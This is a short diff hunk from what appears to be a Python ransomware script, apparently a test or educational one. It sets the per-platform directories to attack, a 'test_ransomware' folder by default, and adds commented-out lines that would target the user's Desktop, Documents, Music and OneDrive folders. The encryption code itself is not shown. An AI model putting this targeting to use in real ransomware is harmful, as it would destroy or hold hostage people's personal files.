@@ -91,7 +91,13 @@ def main():
         if plt == "Linux" or plt == "Darwin":
             startdirs = [os.environ['HOME'] + '/test_ransomware']
         elif plt == "Windows":
-            startdirs = [os.environ['USERPROFILE'] + '\\desktop\\test_ransomware']
+            startdirs = [os.environ['USERPROFILE'] + '\\test_ransomware']
+            # Can also hardcode additional directories
+            # startdirs = [os.environ['USERPROFILE'] + '\\Desktop', 
+                        # os.environ['USERPROFILE'] + '\\Documents',
+                        # os.environ['USERPROFILE'] + '\\Music',
+                        # os.environ['USERPROFILE'] + '\\Desktop',
+                        # os.environ['USERPROFILE'] + '\\Onedrive']
         else:
             print("Unidentified system")
             exit(0)
